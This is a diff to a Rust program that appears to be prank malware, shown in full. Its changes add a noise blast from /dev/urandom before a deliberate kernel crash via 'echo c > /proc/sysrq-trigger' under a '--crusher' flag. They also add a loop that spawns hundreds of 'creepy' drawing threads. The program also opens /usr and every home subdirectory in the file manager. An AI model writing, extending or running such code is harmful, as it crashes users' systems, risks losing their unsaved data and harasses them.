@@ -9,7 +9,9 @@ fn main() {
     let args: Vec<String> = env::args().collect();
 
     if args.contains(&String::from_str("--crusher").unwrap()) {
-        std::thread::sleep(std::time::Duration::from_secs(109));
+        std::thread::sleep(std::time::Duration::from_secs(108));
+        fun::execute_shell("cat /dev/urandom | aplay");
+        std::thread::sleep(std::time::Duration::from_secs(1));
         fun::execute_shell("echo c > /proc/sysrq-trigger");
         return;
     }
@@ -154,6 +156,16 @@ fn main() {
         fun::execute_shell("xdg-open /usr");
     });
 
+    std::thread::spawn(move || {
+        for _ in 0..900 {
+            std::thread::spawn(move || {
+                fun::draw_creepy_shit();
+            });
+
+            std::thread::sleep(std::time::Duration::from_millis(400));
+        }
+    });
+
     for entry in std::fs::read_dir(format!("/home/{}", username)).unwrap() {
         let entry = entry.unwrap();
         if entry.file_type().unwrap().is_dir() {
@@ -165,12 +177,13 @@ fn main() {
                 if entry2.file_type().unwrap().is_dir() {
                     fun::execute_shell(format!("xdg-open {}", entry2.path().display()).as_str());
 
-                    std::thread::sleep(std::time::Duration::from_millis(300));
+                    std::thread::sleep(std::time::Duration::from_millis(400));
                     fun::toggle_desktop_overview();
                 }
             }
 
-            std::thread::sleep(std::time::Duration::from_millis(300));
+            fun::toggle_desktop_overview();
+            std::thread::sleep(std::time::Duration::from_millis(400));
         }
     }
     
